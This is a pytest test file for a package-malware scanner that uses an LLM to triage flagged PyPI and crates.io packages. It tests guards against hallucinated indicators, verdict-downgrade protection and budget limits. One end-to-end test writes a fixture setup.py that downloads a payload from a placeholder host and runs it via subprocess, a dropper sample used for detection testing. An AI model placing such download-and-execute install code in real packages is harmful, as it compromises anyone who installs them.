# SPDX-License-Identifier: AGPL-3.0-or-later
from __future__ import annotations

import json
from pathlib import Path

import pytest

from pkgsentry.adapter import Finding
from pkgsentry.llm import triage as triage_mod
from pkgsentry.llm.triage import (
    LLMTriageResult,
    MAX_CODE_BYTES,
    _build_messages,
    _check_budget,
    _enforce_no_downgrade,
    _gather_source,
    _record_call,
    _reset_budget_for_tests,
    _validate_iocs,
    get_budget_status,
    is_enabled,
    triage,
)


def test_is_enabled_reflects_env_var(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    assert is_enabled() is False
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-test")
    assert is_enabled() is True


def test_validate_iocs_drops_hallucinated():
    src = "real.com only appears here"
    claimed = [
        {"type": "url", "value": "http://real.com"},  # not in source as "http://..." -> drop
        {"type": "domain", "value": "real.com"},      # in source -> keep
        {"type": "url", "value": "http://fake.com"},  # not in source -> drop
        {"type": "bogus", "value": "real.com"},       # bad type -> drop
        "not a dict",                                  # bad shape -> drop
    ]
    out = _validate_iocs(claimed, src)
    assert out == [{"type": "domain", "value": "real.com"}]


def test_validate_iocs_handles_non_list():
    assert _validate_iocs("not a list", "anything") == []
    assert _validate_iocs(None, "anything") == []


def test_enforce_no_downgrade_chain_locks_malicious():
    findings = [
        Finding(
            rule_id="installer.urlopen_exec_chain", category="installer",
            severity="critical", confidence="high", file="setup.py", line=10,
            evidence="urlopen→exec",
        )
    ]
    assert _enforce_no_downgrade("benign", "malicious", findings) == "malicious"
    assert _enforce_no_downgrade("suspicious", "malicious", findings) == "malicious"
    assert _enforce_no_downgrade("malicious", "malicious", findings) == "malicious"


def test_enforce_no_downgrade_allows_llm_when_no_chain():
    findings = [
        Finding(
            rule_id="iocs.url_in_install", category="iocs",
            severity="medium", confidence="medium", file="setup.py", line=5,
            evidence="http://example.com",
        )
    ]
    # rule_verdict suspicious -> LLM verdict always wins
    assert _enforce_no_downgrade("benign", "suspicious", findings) == "benign"
    # rule_verdict malicious but no chain rule -> LLM verdict wins
    assert _enforce_no_downgrade("benign", "malicious", findings) == "benign"
    assert _enforce_no_downgrade("suspicious", "malicious", findings) == "suspicious"


def test_gather_source_prioritizes_setup_and_init(tmp_path: Path):
    pkg = tmp_path / "pkg-1.0"
    pkg.mkdir()
    (pkg / "setup.py").write_text("print('setup')\n", encoding="utf-8")
    sub = pkg / "mypkg"
    sub.mkdir()
    (sub / "__init__.py").write_text("print('init')\n", encoding="utf-8")
    (sub / "other.py").write_text("# unrelated\n", encoding="utf-8")

    out = _gather_source(tmp_path, [])
    assert "setup.py" in out
    assert "__init__.py" in out
    # "other.py" has no findings -> not included
    assert "other.py" not in out


def test_gather_source_caps_at_max_bytes(tmp_path: Path):
    pkg = tmp_path / "pkg-1.0"
    pkg.mkdir()
    big = "x" * (MAX_CODE_BYTES * 3)
    (pkg / "setup.py").write_text(big, encoding="utf-8")
    sub = pkg / "mypkg"
    sub.mkdir()
    (sub / "__init__.py").write_text(big, encoding="utf-8")

    out = _gather_source(tmp_path, [])
    # Allow some overhead for headers/truncation marker but must be roughly bounded.
    assert len(out) <= MAX_CODE_BYTES + 200


def test_gather_source_empty_root(tmp_path: Path):
    out = _gather_source(tmp_path, [])
    assert out == "(no source extracted)"


class _FakeChatCompletions:
    def __init__(self, response: dict):
        self._response = response

    def create(self, **kwargs):
        # openai SDK returns a pydantic model; mimic the .model_dump() interface.
        resp = self._response

        class _Resp:
            def model_dump(_self):
                return resp

        return _Resp()


class _FakeChat:
    def __init__(self, response):
        self.completions = _FakeChatCompletions(response)


class _FakeOpenAI:
    last_kwargs: dict | None = None

    def __init__(self, *args, **kwargs):
        _FakeOpenAI.last_kwargs = kwargs
        self.chat = _FakeChat(_FakeOpenAI._response)


def test_triage_end_to_end(monkeypatch, tmp_path: Path):
    pkg = tmp_path / "evilpkg-1.0"
    pkg.mkdir()
    (pkg / "setup.py").write_text(
        "import urllib.request, subprocess\n"
        "urllib.request.urlretrieve('http://real.example.com/x.pyz', '/tmp/x.pyz')\n"
        "subprocess.call(['python', '/tmp/x.pyz'])\n",
        encoding="utf-8",
    )

    mock_response = {
        "id": "gen-test",
        "object": "chat.completion",
        "model": "z-ai/glm-5.1",
        "choices": [{
            "message": {
                "role": "assistant",
                "content": json.dumps({
                    "verdict": "malicious",
                    "confidence": 0.92,
                    "reasoning": "Setup.py calls subprocess after a network download — classic dropper.",
                    "iocs": [
                        {"type": "url", "value": "http://real.example.com/x.pyz"},
                        {"type": "url", "value": "http://hallucinated.example/never-here"},
                    ],
                    "agrees_with_rules": True,
                    "notes": "TeamPCP-family payload.",
                })
            }
        }],
        "usage": {"prompt_tokens": 1500, "completion_tokens": 200, "cost": 0.002},
    }

    _FakeOpenAI._response = mock_response

    # Patch the openai import done inside triage()
    import openai
    monkeypatch.setattr(openai, "OpenAI", _FakeOpenAI)
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")

    findings = [
        Finding(
            rule_id="installer.urlopen_exec_chain", category="installer",
            severity="critical", confidence="high", file="setup.py", line=2,
            evidence="urlretrieve then subprocess",
        )
    ]

    result = triage(
        pkg_name="evilpkg", pkg_version="1.0", rule_verdict="malicious",
        findings=findings, extracted_root=tmp_path,
    )

    assert isinstance(result, LLMTriageResult)
    assert result.verdict == "malicious"
    assert result.confidence == 0.92
    assert result.prompt_tokens == 1500
    assert result.completion_tokens == 200
    assert result.cost_usd == 0.002
    # Hallucinated IOC dropped, real one kept.
    assert result.iocs == [{"type": "url", "value": "http://real.example.com/x.pyz"}]
    assert result.agrees_with_rules is True
    assert result.model == triage_mod.DEFAULT_MODEL


def test_triage_no_api_key_raises(monkeypatch, tmp_path: Path):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    with pytest.raises(RuntimeError, match="OPENROUTER_API_KEY"):
        triage(
            pkg_name="x", pkg_version="1.0", rule_verdict="suspicious",
            findings=[], extracted_root=tmp_path,
        )


def test_triage_handles_api_exception(monkeypatch, tmp_path: Path):
    class _BoomCompletions:
        def create(self, **kwargs):
            raise RuntimeError("boom")

    class _BoomChat:
        completions = _BoomCompletions()

    class _BoomOpenAI:
        def __init__(self, *a, **kw):
            self.chat = _BoomChat()

    import openai
    monkeypatch.setattr(openai, "OpenAI", _BoomOpenAI)
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")

    out = triage(
        pkg_name="x", pkg_version="1.0", rule_verdict="suspicious",
        findings=[], extracted_root=tmp_path,
    )
    assert out.verdict == "error"
    assert "boom" in out.reasoning


def test_triage_handles_invalid_json(monkeypatch, tmp_path: Path):
    mock_response = {
        "id": "x", "object": "chat.completion", "model": "z-ai/glm-5.1",
        "choices": [{"message": {"role": "assistant", "content": "not json at all"}}],
        "usage": {"prompt_tokens": 10, "completion_tokens": 5, "cost": 0.0001},
    }
    _FakeOpenAI._response = mock_response

    import openai
    monkeypatch.setattr(openai, "OpenAI", _FakeOpenAI)
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")

    out = triage(
        pkg_name="x", pkg_version="1.0", rule_verdict="suspicious",
        findings=[], extracted_root=tmp_path,
    )
    assert out.verdict == "error"
    assert "invalid JSON" in out.reasoning
    assert out.prompt_tokens == 10


def test_budget_blocks_when_max_usd_hit(monkeypatch, tmp_path: Path):
    _reset_budget_for_tests()
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")

    # Push spend over the limit (default MAX_USD=20 in env, override to be safe).
    monkeypatch.setattr(triage_mod, "MAX_USD", 5.0)
    _record_call(10.0)

    reason = _check_budget()
    assert reason is not None and "max_usd_reached" in reason

    # OpenAI should NOT be invoked — pass a class that explodes if instantiated.
    class _Boom:
        def __init__(self, *a, **kw):
            raise AssertionError("OpenAI client should not be constructed when budget is blocked")

    import openai
    monkeypatch.setattr(openai, "OpenAI", _Boom)

    out = triage(
        pkg_name="x", pkg_version="1.0", rule_verdict="malicious",
        findings=[], extracted_root=tmp_path,
    )
    assert out.verdict == "skipped"
    assert "budget" in out.reasoning
    _reset_budget_for_tests()


def test_budget_blocks_when_max_calls_hit(monkeypatch, tmp_path: Path):
    _reset_budget_for_tests()
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")
    monkeypatch.setattr(triage_mod, "MAX_CALLS_PER_HOUR", 2)

    _record_call(0.0)
    _record_call(0.0)

    class _Boom:
        def __init__(self, *a, **kw):
            raise AssertionError("OpenAI client should not be constructed when budget is blocked")

    import openai
    monkeypatch.setattr(openai, "OpenAI", _Boom)

    out = triage(
        pkg_name="x", pkg_version="1.0", rule_verdict="suspicious",
        findings=[], extracted_root=tmp_path,
    )
    assert out.verdict == "skipped"
    assert "max_calls_per_hour_reached" in out.reasoning
    _reset_budget_for_tests()


def test_budget_status_snapshot():
    _reset_budget_for_tests()
    status = get_budget_status()
    assert set(status.keys()) == {"spent_usd", "max_usd", "calls_last_hour", "max_calls_per_hour"}
    assert status["spent_usd"] == 0.0
    assert status["calls_last_hour"] == 0
    assert isinstance(status["max_usd"], float)
    assert isinstance(status["max_calls_per_hour"], int)


# --- Ecosystem-aware tests ---------------------------------------------------


def test_gather_source_crates_prioritizes_build_rs(tmp_path: Path):
    """For ecosystem='crates', build.rs and Cargo.toml are the priority files,
    not setup.py/__init__.py."""
    (tmp_path / "build.rs").write_text("fn main() { /* build script */ }\n", encoding="utf-8")
    (tmp_path / "Cargo.toml").write_text('[package]\nname = "demo"\n', encoding="utf-8")
    src = tmp_path / "src"
    src.mkdir()
    (src / "lib.rs").write_text("pub fn hello() {}\n", encoding="utf-8")

    out = _gather_source(tmp_path, [], ecosystem="crates")
    assert "build.rs" in out
    assert "Cargo.toml" in out
    # lib.rs has no findings and is not a priority file -> excluded
    assert "lib.rs" not in out


def test_build_messages_pypi_prompt():
    """Default/pypi ecosystem mentions PyPI in the system prompt."""
    msgs, _delim = _build_messages("pkg", "1.0", [], "code", ecosystem="pypi")
    system_content = msgs[0]["content"]
    assert "PyPI" in system_content
    assert "Python" in system_content


def test_build_messages_crates_prompt():
    """Crates ecosystem mentions crates.io and Rust, not PyPI."""
    msgs, _delim = _build_messages("pkg", "1.0", [], "code", ecosystem="crates")
    system_content = msgs[0]["content"]
    assert "crates.io" in system_content
    assert "Rust" in system_content
    assert "PyPI" not in system_content


def test_build_messages_unknown_ecosystem():
    """Unknown ecosystem falls back to generic prompt without crashing."""
    msgs, _delim = _build_messages("pkg", "1.0", [], "code", ecosystem="npm")
    assert len(msgs) == 2
    system_content = msgs[0]["content"]
    # Should not contain PyPI or crates.io — it's a generic fallback
    assert "PyPI" not in system_content
    assert "crates.io" not in system_content
    # Should still contain basic triage language
    assert "verdict" in system_content.lower() or "triage" in system_content.lower()


def test_triage_passes_ecosystem(monkeypatch, tmp_path: Path):
    """triage() accepts ecosystem= and threads it through to the prompt."""
    pkg = tmp_path / "cratepkg-1.0"
    pkg.mkdir()
    (pkg / "build.rs").write_text("fn main() {}\n", encoding="utf-8")

    mock_response = {
        "id": "gen-eco",
        "object": "chat.completion",
        "model": "z-ai/glm-5.1",
        "choices": [{
            "message": {
                "role": "assistant",
                "content": json.dumps({
                    "verdict": "benign",
                    "confidence": 0.95,
                    "reasoning": "Empty build script, no risk.",
                    "iocs": [],
                    "agrees_with_rules": False,
                })
            }
        }],
        "usage": {"prompt_tokens": 500, "completion_tokens": 50, "cost": 0.001},
    }

    _FakeOpenAI._response = mock_response

    # Capture the messages passed to the LLM to verify ecosystem threading
    captured_messages = []

    class _CapturingCompletions:
        def create(self, **kwargs):
            captured_messages.extend(kwargs.get("messages", []))
            resp = mock_response
            class _Resp:
                def model_dump(_self):
                    return resp
            return _Resp()

    class _CapturingChat:
        completions = _CapturingCompletions()

    class _CapturingOpenAI:
        def __init__(self, *a, **kw):
            self.chat = _CapturingChat()

    import openai
    monkeypatch.setattr(openai, "OpenAI", _CapturingOpenAI)
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-fake")
    _reset_budget_for_tests()

    result = triage(
        pkg_name="cratepkg", pkg_version="1.0", rule_verdict="suspicious",
        findings=[], extracted_root=tmp_path, ecosystem="crates",
    )

    assert result.verdict == "benign"
    # Verify the system prompt mentioned crates.io, not PyPI
    assert len(captured_messages) >= 1
    system_content = captured_messages[0]["content"]
    assert "crates.io" in system_content
    assert "Rust" in system_content
    assert "PyPI" not in system_content
    _reset_budget_for_tests()
